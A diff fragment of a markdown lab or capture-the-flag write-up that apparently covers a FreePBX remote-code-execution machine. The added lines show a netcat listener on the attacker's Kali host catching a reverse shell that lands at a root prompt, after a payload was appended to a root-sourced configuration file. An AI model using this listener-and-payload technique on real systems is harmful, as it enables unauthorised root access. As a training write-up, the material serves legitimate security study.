@@ -1281,7 +1281,61 @@ Append the reverse shell payload to the writable, root-sourced configuration fil
 ```
 
 ```shell
+┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
+└─$ nc -lvnp 4446
+listening on [any] 4446 ...
+connect to [10.10.14.85] from (UNKNOWN) [10.129.245.100] 48534
+bash: no job control in this shell
+______                   ______ ______ __   __
+|  ___|                  | ___ \| ___ \\ \ / /                                            
+| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                             
+|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                             
+| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                            
+\_|    |_|    \___| \___|\_|    \____/ \/   \/                                            
+                                                                                          
+                                                                                          
+NOTICE! You have 3 notifications! Please log into the UI to see them!                     
+Current Network Configuration
++-----------+-------------------+---------------------------+
+| Interface | MAC Address       | IP Addresses              |
++-----------+-------------------+---------------------------+
+| eth0      | A2:DE:AD:1E:70:1F | 10.129.245.100            |
+|           |                   | fe80::82bd:1bcb:a990:dd3b |
++-----------+-------------------+---------------------------+
 
+Please note most tasks should be handled through the GUI.
+You can access the GUI by typing one of the above IPs in to your web browser.
+For support please visit: 
+    http://www.freepbx.org/support-and-professional-services
+
++---------------------------------------------------------------------+
+| This machine is not activated.  Activating your system ensures that |
+| your machine is eligible for support and that it has the ability to |
+| install Commercial Modules.                                         |
+|                                                                     |
+| If you already have a Deployment ID for this machine, simply run:   |
+|                                                                     |
+|    fwconsole sysadmin activate deploymentid                         |
+|                                                                     |
+| to assign that Deployment ID to this system. If this system is new, |
+| please go to Activation (which is on the System Admin page in the   |
+| Web UI) and create a new Deployment there.                          |
++---------------------------------------------------------------------+
+
+[root@connected /]# 
+```
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.6 Root Flag
+
+```
 ```
 <div align="center">
 <br>
